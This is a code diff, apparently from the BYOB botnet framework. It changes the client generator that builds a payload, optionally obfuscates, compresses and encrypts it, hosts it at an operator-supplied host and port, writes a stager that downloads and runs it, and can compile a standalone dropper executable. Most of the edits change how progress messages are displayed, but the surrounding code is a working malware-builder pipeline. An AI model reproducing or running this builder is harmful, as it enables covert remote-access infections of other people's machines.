@@ -76,14 +76,14 @@ import subprocess
 # packages
 try:
     import colorama
-    colorama.init()
+    colorama.init(autoreset=True)
 except: pass
 
 # loading animation
 from core.util import spinner
 __load__ = threading.Event()
 __load__.set()
-__spin__ = spinner(__load__)
+#__spin__ = spinner(__load__)
 
 # modules
 from core import generators, security, util
@@ -168,9 +168,9 @@ def progress_update(input, output, task=None):
     """
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
     __load__.clear()
-    util.display("[+] ", color='green', style='bright', end='')
+    util.display("\t[+]", color='green', style='bright', end=',')
     util.display(" ".join([task if task else "", "Complete" if len(str(task).split()) <= 1 else ""]), color='reset', style='bright')
-    util.display("    ({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')
+    util.display("\t({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')
     __load__.set()
 
 def run(options):
@@ -189,21 +189,28 @@ def run(options):
     imports = set()
 
     # modules
+    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display('Modules', color='reset', style='bright')
     modules = ['core/importer.py','core/util.py','core/security.py','core/payload.py']
+    for m in modules:
+        util.display('\tadding {}...'.format(os.path.splitext(m)[0].replace('/','.')), color='reset', style='dim')
     if len(options.modules):
         for m in options.modules:
-	    m = str(m)
-	    util.log('checking module {}...'.format(m))
-	    base = os.path.splitext(os.path.basename(m))[0]
-            if not os.path.exists(m):
-		_m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
-		if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
-		    util.log("skipping module '{}' (does not exist)".format(m))
-		    continue
-	    util.log("adding module {}...".format(m))
-	    modules.append(os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py'])))
+	    if isinstance(m, str):
+                util.display('\tadding {}...'.format(m), color='reset', style='dim')
+                base = os.path.splitext(os.path.basename(m))[0]
+                if not os.path.exists(m):
+                    _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
+                    if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
+                        util.display("[-]", color='red', style='dim')
+                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='dim')
+                        continue
+                module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
+                modules.append(module)
 
     # imports
+    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("Imports", color='reset', style='bright')
     for module in modules:
         for line in open(module, 'r').read().splitlines():
             if len(line.split()):
@@ -212,25 +219,28 @@ def run(options):
 		elif len(line.split()) > 3:
 		    if line.split()[0] == 'from' and line.split()[1] != '__future__' and line.split()[2] == 'import':
 			imports.add(line.strip())
-
+    util.display("\t[+]", color='green', style='bright', end=',')
+    util.display("{} Imports Complete".format(len(list(imports))), color='reset', style='dim')
+                 
     # payload
-    util.display("\n\tGenerating payload...", color='reset', style='dim')
+    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("Payload", color='reset', style='dim')
     payload = '\n'.join(['#!/usr/bin/env python'] + list(imports) + [open(module,'r').read().partition('# main')[2] for module in modules]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
 
     if options.obfuscate:
-        util.display("Obfuscating payload...", color='reset', style='dim')
+        util.display("\n\tObfuscating payload...", color='reset', style='dim')
         output  = generators.obfuscate(payload)
         progress_update(payload, output, task='Obfuscation')
         payload = output
 
     if options.compress:
-        util.display("Compressing payload...", color='reset', style='dim')
+        util.display("\n\tCompressing payload...", color='reset', style='dim')
         output  = generators.compress(payload)
         progress_update(payload, output, task='Compression')
         payload = output
 
     if options.encrypt:
-        util.display("Encrypting payload with 128-bit key: ({})...".format(key), color='reset', style='dim')
+        util.display("\n\tEncrypting payload...".format(key), color='reset', style='dim')
         output  = generators.encrypt(payload, key)
         progress_update(payload, output, task='Encryption')
         payload = output
@@ -246,39 +256,40 @@ def run(options):
 	path = os.path.join(os.path.abspath(dirname), var + '.py' )
         with file(path, 'w') as fp:
             fp.write(payload)
-        url = 'http://{}:{}{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.getcwd())))
+        url = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.getcwd())))
 
-    util.display("[+] ", color='green', style='bright', end='')
-    util.display("Payload Complete", style='bright', color='reset')
-    util.display("    (hosting payload at {})".format(url))
+    util.display("\t[+]", color='green', style='bright', end='')
+    util.display("Upload Complete", color='reset', style='bright')
+    util.display("\t\t(hosting payload at: {}".format(url), color='reset', style='dim')
 
     # stager
-    util.display("\n\tGenerating stager...", color='reset', style='dim')
+    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("Stager", color='reset', style='dim')
     stager  = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=url, key=key)
 
     if options.obfuscate:
-        util.display("Obfuscating stager...", color='reset', style='dim')
+        util.display("\n\tObfuscating stager...", color='reset', style='dim')
         output = generators.obfuscate(stager)
         progress_update(stager, output, task='Obfuscation')
         stager = output
-
+    ''' 
     if options.compress:
-        util.display("Compressing stager...", color='reset', style='dim')
+        util.display("\n\tCompressing stager...", color='reset', style='dim')
         output = generators.compress(stager)
         progress_update(stager, output, task='Compression')
         stager = output
-
-    util.display("[+] ", color='green', style='bright', end='')
-    util.display("Stager Complete", color='reset', style='bright')
-
+    '''
     # client
-    util.display("\n\tGenerating client...", color='reset', style='dim')
+    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("Client", color='reset', style='bright')
     client = 'byob_{}.py'.format(var) if not options.name else options.name
     if not client.endswith('.py'):
         client += '.py'
     with file(client, 'w') as fp:
         fp.write(stager)
+    util.display("    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("\t[+]")), style='dim', color='reset')
 
+    # dropper
     if options.compile:
         if sys.platform == 'darwin':
             output = generators.app(options, client)
@@ -286,12 +297,9 @@ def run(options):
             client = output
         else:
             output = generators.exe(options, client)
-            progress_update(stager, open(output, 'rb').read(), task='Compiled Standalone Binary Executable')
+            progress_update(stager, open(output, 'rb').read(), task='Compiled Standalone Executable')
             client = output
-
-    util.display("[+] ", color='green', style='bright', end='')
-    util.display("Client Complete", color='reset', style='bright')
-    util.display( "    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("[+] ")), style='dim', color='reset')
+        util.display( "    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("\t[+]")), style='dim', color='reset')
     __load__.clear()
     return client
 
